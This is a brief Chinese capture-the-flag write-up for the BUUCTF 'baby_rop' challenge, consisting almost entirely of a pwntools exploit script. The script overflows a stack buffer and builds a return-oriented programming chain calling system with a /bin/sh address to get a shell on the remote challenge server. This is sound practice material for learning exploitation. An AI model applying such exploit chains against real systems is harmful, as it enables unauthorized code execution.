# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)

checksec



# exp

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=remote('node5.buuoj.cn',27632)
#p=process('./babyrop')
elf=ELF('./babyrop')

bin_addr = 0x601048
system_addr = elf.sym['system']
ret_addr=0x400479
pop_rdi=0x400683
payload=flat(b'A'*0x18,p64(ret_addr),p64(pop_rdi),p64(bin_addr),p64(system_addr))

p.recv()
p.sendline(payload)
p.interactive()
```

